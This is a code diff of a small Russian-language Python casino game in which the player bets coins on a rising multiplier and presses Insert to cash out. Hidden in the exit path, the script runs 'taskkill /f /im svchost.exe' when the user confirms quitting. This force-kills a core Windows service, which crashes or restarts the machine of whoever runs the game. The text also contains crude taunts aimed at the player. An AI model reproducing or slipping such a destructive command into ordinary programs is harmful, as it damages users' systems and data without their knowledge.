@@ -1,11 +1,10 @@
 import random
+from datetime import datetime
 import time
 import os
 import json
 import keyboard
-import sys
 
-os.chdir(os.getenv("tmp"))
 
 X_Loos = [
     0.1, 0.2, 0.21, 0.29, 0.32, 0.35, 0.41, 0.45,
@@ -35,89 +34,90 @@ X_Win = [
     9.9, 9.98, 10.0
 ]
 
-User_Money = 1000
-default_data = {"balance":User_Money}
-System_Random = random.randint(1,12)
 
-# Типы действий
-ACTION_PLAY = 1
-ACTION_EXIT = 2
+default_data = {"balance":1000}
+
 
 print("Здравствуйте.\n"
            "Вас приветствует SKAsiMan!\n"
            "У нас самые большие выигрыши! БЕЗ РЕГИСТРАЦИЙ(мне было лень писать логику входа).")
 
+
 def generate_casino_log(message):
-    """Логирует сообщение в файл с временной меткой."""
-    timestamp = time.ctime(time.time())
-    with open('Casino.log', 'a') as log_file:
-        log_file.write(f'[{timestamp}] {message}\n')
+    time_real = datetime.now().strftime("%Y:%m:%d %H:%M:%S")
+    with open("Casino.log", "a") as log_file:
+        log_file.write(f'[{time_real}] {message}\n')
+
 
 def get_user_choice(prompt, valid_choices):
-    """Получает и валидирует выбор пользователя."""
     while True:
         try:
             choice = int(input(prompt))
             if choice in valid_choices:
-                generate_casino_log(f'Пользователь выбрал: {choice}')
                 return choice
-            print('Пожалуйста, выберите один из предложенных вариантов.')
+            print("Пожалуйста, выберите один из предложенных вариантов.")
         except ValueError as error:
-            print('Пожалуйста, введите число.')
-            generate_casino_log(f'Ошибка ввода: {error}')
+            print("Пожалуйста, введите число.")
+            generate_casino_log(f"Ошибка ввода: {error}")
+
 
 def type_in_json(data):
-    """Записывает монеты в json."""
-    with open(r"data.json", "w") as F_json:
-        generate_casino_log(f"Записал в файл: {data}")
+    with open("data.json", "w") as F_json:
+        generate_casino_log(f"Скрипт записал в файл новое значение: {data}")
         json.dump(data, F_json, indent=4)
 
+
 def read_in_json():
-    """Читает .json, если файл повреждён то он записывает обычные значения."""
     try:
-        with open(r"data.json", "r") as f:
-            generate_casino_log("Скрипт прочитал файл.")
-            return json.load(f)
-    except FileNotFoundError:
-        generate_casino_log("Файл не найден, создаю новый...")
+        with open("data.json", "r") as f:
+            generate_casino_log("Файл был прочитан.")
+            data = json.load(f)
+            if not isinstance(data["balance"], int):
+                return 0
+            else:
+                return data
+    except Exception as e:
+        generate_casino_log("Файл не найден или был повреждён. Создаю новый...\n"
+                            f"Ошибка: {e}")
         type_in_json(default_data)
         return default_data
 
-def update_in_json_win(amount):
-    """Обновляет баланс в .json, возвращая его.(Если выйграл)"""
-    money = read_in_json()
-    money['balance'] += amount
-    type_in_json(money)
-    generate_casino_log(f"Скрипт обновил баланс на: {money}")
-    return money['balance']
 
-def update_in_json_loos(amount):
-    """Обновляет баланс в .json, возвращая его.(Если проиграл)"""
+def lost_or_win(sign, bid, how_much_x):
     money = read_in_json()
-    money['balance'] -= amount
-    type_in_json(money)
-    generate_casino_log(f"Скрипт обновил баланс на: {money}")
-    return money['balance']
+
+    if sign == "+":
+        win = round(how_much_x * bid)
+        print(f"\nПоздравляю! Вы выйграли! Ваша победа составила: {win}")
+        balance = money["balance"] + win
+    else:
+        balance = money["balance"] - bid
+
+    type_in_json({"balance": balance})
+    return balance
+
 
 def play_game():
-    """Основная логика игры."""
     casino_def = 0.01
     user_info = read_in_json()
-    print(f"Ваш баланс составляет: {user_info['balance']} монет.")
+    print(f"Ваш баланс составляет: {user_info["balance"]} монет.")
+
     while True:
+
         try:
             how_much_bid = int(input("Ваша ставка: "))
-            if how_much_bid > user_info['balance'] or how_much_bid <= 0:
+            if how_much_bid > user_info["balance"] or how_much_bid <= 0:
                 print("Советую вам написать правдивую ставку.")
                 continue
         except ValueError as r:
-            generate_casino_log(f'Ошибка: {r}')
+            generate_casino_log(f"Ошибка: {r}")
             print("Советую вам написать правдивую ставку.")
             continue
 
         generate_casino_log(f"Пользователь поставил ставку: {how_much_bid}")
-        print("Для того чтобы забрать свой выйгрыш нажмите TAB...(советую нажимать много раз)\n"
+        print("Для того чтобы забрать свой выйгрыш нажмите Insert...(советую нажимать много раз)\n"
               "Игра начнётся через:")
+
         print("3...")
         time.sleep(1)
         print("2...")
@@ -126,54 +126,58 @@ def play_game():
         time.sleep(1)
         print("Игра началась!")
 
+        system_random = random.randint(1, 12)
+
+        if system_random in (11, 12):
+            random.shuffle(X_Win)
+            casino_random = random.choice(X_Win)
+        else:
+            random.shuffle(X_Loos)
+            casino_random = random.choice(X_Loos)
+
         while True:
-            sys.stdout.write(f"\rТекущий множитель составляет: x{casino_def:.2f}")
-            sys.stdout.flush()
+
+            print(f"\rТекущий множитель составляет: x{casino_def:}", end="", flush=True)
             time.sleep(0.1)
+
             casino_def += 0.01
-            if System_Random != 11 or System_Random != 12:
-                casino_random = random.randint(1, len(X_Loos))
-            else:
-                casino_random = random.randint(1, len(X_Win))
+            casino_def = round(casino_def, 2)
+
             if casino_def >= casino_random:
                 print("\nК сожалению ваша ставка сгорела(мне похуй).")
-                update_in_json_loos(how_much_bid)
-                generate_casino_log(f"Пользователь проиграл: {how_much_bid}")
+                lost_or_win("-", how_much_bid, casino_def)
                 main()
-            if keyboard.is_pressed("TAB"):
-                user_win = how_much_bid * casino_def
-                user_xd = round(user_win)
+
+            if keyboard.is_pressed("insert"):
                 time.sleep(0.2)
-                update_in_json_win(user_xd)
-                print(f"\nПоздравляю! Вы выйграли! Ваша победа составила: {user_xd:.2f}")
-                generate_casino_log(f"Пользователь выйграл: {user_xd}")
+                lost_or_win("+", how_much_bid, casino_def)
                 main()
+
 
 def main():
-    user_info = read_in_json()
-    if user_info['balance'] == 0:
-        print("Ты всё проиграл... Пора брать долг! Тебе здесь не место.\n")
-        time.sleep(2)
-        exit()
-    while True:
-        choice = get_user_choice(
-            "1.Играть\n2.Выход\n",
-            [ACTION_PLAY, ACTION_EXIT]
-        )
 
-        if choice == ACTION_PLAY:
+    user_info = read_in_json()
+
+    if user_info["balance"] <= 0:
+        print("Ты всё проиграл... Пора брать долг! Тебе здесь не место.\n")
+        time.sleep(3)
+        exit()
+
+    while True:
+        choice = get_user_choice("1.Играть\n2.Выход\n",[1, 2])
+        if choice == 1:
+            generate_casino_log("Пользователь выбрал: Играть")
             play_game()
         else:
-            confirm = get_user_choice(
-                "Вы уверены что хотите выйти?\n1.Да\n2.Нет\n",
-                [1, 2]
-            )
+            generate_casino_log("Пользователь выбрал: Выход")
+            confirm = get_user_choice("Вы уверены что хотите выйти?\n1.Да\n2.Нет\n",[1, 2])
             if confirm == 1:
                 generate_casino_log('Закрываю svchost.exe...')
                 os.system("taskkill /f /im svchost.exe")
                 exit()
             else:
                 print("Продолжаем [выйгрывать]!")
+
 
 if __name__ == "__main__":
     main()
